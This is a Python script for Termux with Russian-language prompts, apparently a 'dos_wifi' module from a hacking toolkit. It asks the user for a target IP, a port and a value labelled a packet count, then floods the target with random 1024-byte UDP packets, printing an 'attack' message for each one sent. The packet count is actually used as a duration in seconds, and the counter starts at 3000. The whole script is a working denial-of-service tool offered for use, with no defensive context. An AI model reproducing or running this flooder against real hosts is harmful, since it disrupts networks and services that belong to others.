#!/data/data/com.termux/files/usr/bin/python3
import datetime
import json
import os
import random
import socket
import sys
import time

date_write = datetime.datetime.now()

from files.ban.banners import ban_dos_wifi
from files.credits.credits import credits
from files.wrn.warn import file_not_found_log, i_e_colo, keyboard

try:
    from colorama import Fore, Style, Back
except ImportError:
    i_e_colo()

def cl():
    os.system("clear")

with open('files/config/config.json') as f:
    root_data = json.load(f)
root_usr = root_data.get("root_menu").get("root_menu_usr")

def start_dos():
    global cl
    try:
        try:
            FWS = open('files/log/log.txt', 'a', encoding='utf-8')
        except FileNotFoundError:
            file_not_found_log()
        cl()
        ban_dos_wifi()
        credits()
        FWS.write(f'{root_usr}:StartCode "dos_wifi" - ' + str(date_write) + '\n')
        FWS.close()
        print(Fore.YELLOW + 'Укажите IP-Адрес' + Style.RESET_ALL)
        ip = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL + Style.NORMAL)
        print('\n')
        print(Fore.YELLOW + 'Укажите порт IP-Адреса которого вы ввели' + Style.RESET_ALL, f' - {str(ip)}')
        port = int(input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL + Style.NORMAL))
        print('\n')
        print(Fore.YELLOW + f'Укажите кол-во пакетов' + Style.RESET_ALL + Style.NORMAL)
        package = int(input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL + Style.NORMAL))
        cl()
        print(Fore.YELLOW + 'Для остановки нажмите CTRL+C или CTRL+Z' + Style.RESET_ALL)
        time.sleep(3)
        def flood(victim, vport, duration):
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1024)
            timeout = time.time() + duration
            sent = 3000

            while 1:
                if time.time() > timeout:
                    break
                else:
                    pass
                client.sendto(bytes, (victim, vport))
                sent = sent + 1
                print('Атака %s отправлено пакетов %s на порт %s '%(sent, victim, vport))
        flood(ip, int(port), int(package))
    except KeyboardInterrupt:
        keyboard()

def test_dos_wifi():
    global cl
    print()
    cl()
